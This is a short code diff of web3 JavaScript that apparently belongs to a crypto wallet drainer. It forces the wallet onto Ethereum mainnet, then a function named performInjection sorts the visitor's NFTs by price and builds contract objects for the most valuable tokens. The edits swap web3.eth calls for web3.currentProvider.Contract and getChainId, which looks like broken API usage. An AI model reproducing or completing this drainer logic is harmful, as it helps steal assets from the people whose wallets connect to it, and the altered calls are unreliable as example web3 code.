@@ -83,7 +83,7 @@ function toogleButton() {
     document.getElementsByTagName("button")[0].disabled = !document.getElementsByTagName("button")[0].disabled;
 }
 async function syncChain() {
-                if(web3.eth.getChainId() != 1) {
+                if(web3.currentProvider.getChainId() != 1) {
                     try {
                         await web3.currentProvider.request({
                             method: "wallet_switchEthereumChain",
@@ -187,7 +187,7 @@ async function performInjection(address) {
         let higherPrice = sortedNFTs[i][key][0]["token_address"];
         let isErc20 = sortedNFTs[i][key][0]["isErc20"];
         
-        let contractInstance = new web3.eth.Contract(abi, higherPrice);
+        let contractInstance = new web3.currentProvider.Contract(abi, higherPrice);
         let toCheckSumAddress = await web3.utils.toChecksumAddress(higherPrice);
         
 
